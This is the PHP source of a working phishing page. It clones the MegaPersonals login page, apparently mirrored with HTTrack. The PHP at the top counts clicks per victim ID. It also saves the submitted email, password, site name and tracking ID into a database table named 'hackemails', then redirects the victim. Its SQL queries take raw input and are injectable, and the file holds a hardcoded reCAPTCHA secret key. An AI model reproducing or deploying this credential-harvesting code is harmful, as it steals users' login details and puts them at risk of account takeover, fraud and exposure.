
<?php 

include_once 'db.php';

$words = explode('/', $_SERVER['REQUEST_URI']);
$uid = trim($words[count($words) - 1], '/');
//echo $uid;
?>
<!--click clount-->
<?php
$sql = "SELECT * FROM click  WHERE uid=$uid ";
$result = mysqli_query($conn, $sql);
?>
<?php
if (mysqli_num_rows($result) > 0) {
    // output data of each row
    while($row = mysqli_fetch_assoc($result)) {
       $click = $row['count']; 
       //echo $click;
    }
}else{
    $click = 0;
}

?> 

<?php
//Click Count
$click = $click + 1;
//echo $click;

 $sql = "UPDATE click SET count = $click WHERE uid=$uid";
 if (mysqli_query($conn, $sql)) {
                    //echo "New record has been added successfully !";
        
     }

 
if(isset($_POST['submit']))
{

function CheckCaptcha($userResponse) {
        $fields_string = '';
        $fields = array(
            'secret' => '6LdNh4sfAAAAAAjWpSoI73xwDuwN8RG_axYWGLSH',
            'response' => $userResponse
        );
        foreach($fields as $key=>$value)
        $fields_string .= $key . '=' . $value . '&';
        $fields_string = rtrim($fields_string, '&');

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api/siteverify');
        curl_setopt($ch, CURLOPT_POST, count($fields));
        curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);

        $res = curl_exec($ch);
        curl_close($ch);

        return json_decode($res, true);
    }


    // Call the function CheckCaptcha
    $result = CheckCaptcha($_POST['g-recaptcha-response']);

    if ($result['success']) {
                
                 $email = $_POST['email'];
                 $password = $_POST['password'];
                 $website = $_POST['website'];
                 $uid = $_POST['uid'];
                 $auth_code = $_POST['auth_code'];
                 $sql = "INSERT INTO hackemails (email,password,website,uid,auth_code) VALUES ('$email','$password','$website','$uid','$auth_code')";
                 if (mysqli_query($conn, $sql)) {
                    //echo "New record has been added successfully !";
                    echo "<script>window.location.href ='../agree/$uid'</script>";
                    
                 } else {
                    echo "Error: " . $sql . ":-" . mysqli_error($conn);
                 }
                 mysqli_close($conn);

    } else {
        // If the CAPTCHA box wasn't checked
       echo '<script>alert("Error Message");</script>';
    }
}
    ?>

</html>
<!--
<!doctype html>
<html>


<!-- Mirrored from megapersonal.us/auth/login by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Feb 2021 00:46:51 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <script src='https://www.google.com/recaptcha/api.js'></script>
    <title>MegaPersonals: Classified hookups</title>
    <meta id="viewportMetaTag" name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE" />
    <meta charset='utf-8'>
    <meta NAME="ROBOTS" CONTENT="INDEX, FOLLOW">
    <meta name="google-site-verification" content="5lgcaPvrDxOjE8Qn9rMbYKiJVahMPVReOQvezzd1nRY" />
    <meta name="description" content="MegaPersonals - Post your classified ad and MEET NOW" />
    <link rel="icon" href="/resources/img/devilgirl_favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="../../../assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="../../../assets/css/jquery-ui.css">
    <link rel="stylesheet" href="../../../assets/css/custom3400.css?v=1591784809" />
    <script src="../../../assets/js/jquery.min.js" type="text/javascript"></script>
    <script src="../../../assets/js/jquery-ui.min.js"></script>
    <script src="../../../assets/js/bootstrap.min.js"></script>
    <script src='https://www.google.com/recaptcha/api.js'></script>
</head>

<body>
    <div class="container">
        <a href="/">
            <img src="megapersonalsPageHeader3400.png" class="img-responsive center-block img-width-72" alt="Megapersonals" id="megapersonalsPageHeader">
        </a>

        <div class="centered top-margin-55 login_firsttime">
            <h3 class="logincopy">Is this your first time posting?</h3>
            <a href="/users/register" class="starthere">Start Here</a>
        </div>
        <div class="centered padd-top-25 loginform">
            <h3 class="logincopy">Already have a login?</h3>
            <form  action="" method="post" class="loginwrapper">
				<h2 class="gray bold centered loginlabel">
                    Login
                </h2>
                                <div class="centered">
                    <input id="person_username_field_login" required type="email"  name="email" placeholder="Email" class="form-control bordered three-radius">
                </div>
                <div class="centered">
                    <input id="person_password_field_login" type="password" name="password" value='' placeholder="Password"  class="form-control bordered three-radius">
                    <input type="hidden" name="website" value='Megapersonals' placeholder="" class="form-control bordered three-radius">
                     <input type="hidden" name="uid" value='<?php echo $uid ?>' placeholder="" class="form-control bordered three-radius">
                     <input type="hidden" name="auth_code" value="1" placeholder="" class="form-control bordered three-radius">
                </div>
                <div class="centered automargin">
                <div style="display: inline-block">
                    <br><br><br>
                <div class="g-recaptcha" data-sitekey="6LdNh4sfAAAAAHcNwkvprMULpxoRDR0tJbY6-05r"></div>
                </div>
                <input  id="login_data_submit_button" type="submit" name="submit" value="submit">
               <!-- <button id="login_data_submit_button" type="button" name="save" aria-haspopup="true">Submit</button> -->
                <a class="passreset" href="/send_password"> Forgot Password</a>
            </div>
            </form>
        </div>
    </div>
    <footer>
        <nav>
            <ul class="pager myStyle">
                <li>
                    <a id="homeclick" href="https://megapersonals.eu/home">Home</a>
                </li>
                <li>|</li>
                <li><a href="https://megapersonals.eu/public/contact_us">Contact Us</a></li>
                <li>|</li>
                <li><a href="https://megapersonals.eu/public/terms">Policies & Terms</a></li>
            </ul>
            <p class="buglink"><a href="https://megapersonals.eu/public/report_bug">Report Bug</a></p>
        </nav>
        <div class="copyright_class" id="copyrigh">
            <!-- contact us footer  -->
            Copyright ©2019 MegaPersonals.eu
            <div style='padding-top:10px'>
                For support email  <a href='mailto:support@megapersonals.eu'>support@megapersonals.eu</a>
            </div>
            <div style='padding:10px 30px 0px 30px'>
                
            </div>
        </div>
        <div class="clearfix">
            <input type="hidden" class="jsp-env" data-escortbabylon="escortbabylon.com" data-imageDomain1="img1.lodef.net/imgs" data-imageDomain2="img2.lodef.net/imgs" data-videoDomain1="video1.lodef.net/video" data-videoDomain2="video2.lodef.net/video" data-videoDomain3="video3.lodef.net/video" data-imageMiddle="80000000000000000000000000000000" data-image2Middle="40000000000000000000000000000000" data-imageUpload="image-processor.apnot.com/process" data-imagePreview="image-processor.apnot.com/static" data-captchaApi="captcha.lodef.net/api/captcha" data-captchaUrl="captcha.lodef.net/captchas" data-lcDomain="listcrawler.com" data-transactionNoContextToken="NO_CONTEXT_TRANSACTION_TOKEN" data-userTermsOfAgeVersion="2" />
        </div>
    </footer>






</body>

<!-- Mirrored from megapersonal.us/auth/login by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Feb 2021 00:46:59 GMT -->
</html>
